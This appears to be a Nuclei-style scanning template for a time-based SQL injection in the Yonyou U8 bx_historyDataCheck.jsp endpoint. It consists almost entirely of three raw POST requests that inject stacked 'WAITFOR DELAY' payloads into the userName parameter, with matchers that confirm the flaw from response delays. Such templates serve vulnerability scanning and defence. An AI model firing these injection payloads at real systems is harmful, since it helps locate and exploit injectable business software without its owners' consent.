id: yongyou-u8-bx-historydatacheck-sqli
 
info:
  name: yongyou-u8-bx-historydatacheck-sqli
  author: yongyou-u8-bx-historydatacheck-sqli

requests:
  - raw:
      - |
        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
        Content-Type: application/x-www-form-urlencoded
        
        userName=%27;WAITFOR%20DELAY%20%270:0:3%27--&class.module.classLoader.DefaultAssertionStatus=

      - |
        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
        Content-Type: application/x-www-form-urlencoded
        
        userName=%27;WAITFOR%20DELAY%20%270:0:6%27--&class.module.classLoader.DefaultAssertionStatus=

      - |
        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
        Content-Type: application/x-www-form-urlencoded
        
        userName=%27;WAITFOR%20DELAY%20%270:0:9%27--&class.module.classLoader.DefaultAssertionStatus=

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6 && status_code==200"
          - "duration_2>=6  && duration_2<=9 && status_code==200"
          - "duration_3>=9  && duration_3<=12 && status_code==200"